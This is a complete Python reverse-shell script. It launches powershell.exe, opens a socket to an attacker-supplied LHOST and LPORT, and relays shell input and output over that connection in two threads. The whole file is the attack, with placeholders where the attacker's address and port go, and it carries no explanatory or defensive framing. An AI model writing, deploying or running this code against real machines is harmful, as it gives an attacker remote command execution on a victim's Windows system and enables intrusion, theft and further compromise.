import socket
import os
import threading
import subprocess as sp

# Set your LHOST and LPORT here
LHOST = 'your_ip_address'  # Replace with your IP address
LPORT = your_port_number     # Replace with your port number

# Start the PowerShell process
p = sp.Popen(['powershell.exe'], stdin=sp.PIPE, stdout=sp.PIPE, stderr=sp.STDOUT)

# Create a socket connection
s = socket.socket()
s.connect((LHOST, LPORT))

# Function to send output from PowerShell to the socket
def send_output():
    while True:
        o = os.read(p.stdout.fileno(), 1024)
        s.send(o)

# Function to receive input from the socket and send it to PowerShell
def receive_input():
    while True:
        i = s.recv(1024)
        os.write(p.stdin.fileno(), i)

# Start threads for sending and receiving
threading.Thread(target=send_output, daemon=True).start()
threading.Thread(target=receive_input).start()
